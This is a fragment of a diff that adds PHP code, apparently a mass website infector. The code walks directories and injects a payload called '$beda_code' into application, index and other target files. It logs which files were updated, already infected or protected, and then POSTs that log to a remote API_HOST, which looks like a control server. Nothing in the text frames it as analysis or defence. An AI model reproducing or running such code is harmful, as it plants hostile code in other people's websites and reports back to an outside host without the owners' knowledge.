+
+                        if ((!$code) && (file_exists($appFile))) {
+                            $code = insert_app($appFile, $beda_code);
+                            switch ($code) {
+                                case -2:
+                                    $GLOBALS['RESPONSE'] .= "[$appFile] without regex signature; ";
+                                    break;
+                                case -1:
+                                    $GLOBALS['RESPONSE'] .= "[$appFile] is empty!; ";
+                                    break;
+                                case 0:
+                                    $GLOBALS['RESPONSE'] .= "[$appFile] is protected!; ";
+                                    break;
+                                case 1:
+                                    $GLOBALS['RESPONSE'] .= "[$appFile] updated!; ";
+                                    break;
+                                case 2:
+                                    $GLOBALS['RESPONSE'] .= "[$appFile] contains!; ";
+                                    break;
+                            }
+                        }
+
+                        if ((!$code) && (file_exists($indexFile))) {
+                            $code = insert_index($indexFile, $beda_code);
+                            switch ($code) {
+                                case -2:
+                                    $GLOBALS['RESPONSE'] .= "[$indexFile] without regex signature; ";
+                                    break;
+                                case -1:
+                                    $GLOBALS['RESPONSE'] .= "[$indexFile] is empty!; ";
+                                    break;
+                                case 0:
+                                    $GLOBALS['RESPONSE'] .= "[$indexFile] is protected!; ";
+                                    break;
+                                case 1:
+                                    $GLOBALS['RESPONSE'] .= "[$indexFile] updated!; ";
+                                    break;
+                                case 2:
+                                    $GLOBALS['RESPONSE'] .= "[$indexFile] contains!; ";
+                                    break;
+                            }
+                        }
+
+                        $target = $d . TREX_TARGET;
+                        $update_data = find_and_write($target);
+                        $editFile = $update_data[0];
+                        switch ($update_data[1]) {
+                            case -1:
+                                $GLOBALS['RESPONSE'] .= "[$editFile] empty!; ";
+                                break;
+                            case 0:
+                                $GLOBALS['RESPONSE'] .= "[$editFile] comment not exists!; ";
+                                break;
+                            case 1:
+                                $GLOBALS['RESPONSE'] .= "[$editFile] updated!; ";
+                                break;
+                            case 2:
+                                $GLOBALS['RESPONSE'] .= "[$editFile] contains!; ";
+                                break;
+                        }
+                    }
+                } else {
+                    if (is_dir($d . '/' . $v) && is_readable($d . '/' . $v) && ($v !== ".") && ($v !== "..")) {
+                        $tmp[] = $d . '/' . $v;
+                    }
+                }
+            }
+        }
+        $dd = $tmp;
+    }
+}
+
+$GLOBALS['RESPONSE'] .= " [Finish!] ";
+
+if (!defined("STDIN")) {
+    $url = API_HOST;
+    $post = "logs=" . urlencode($GLOBALS['RESPONSE']);
+    super_get_url($url, $post);
+}
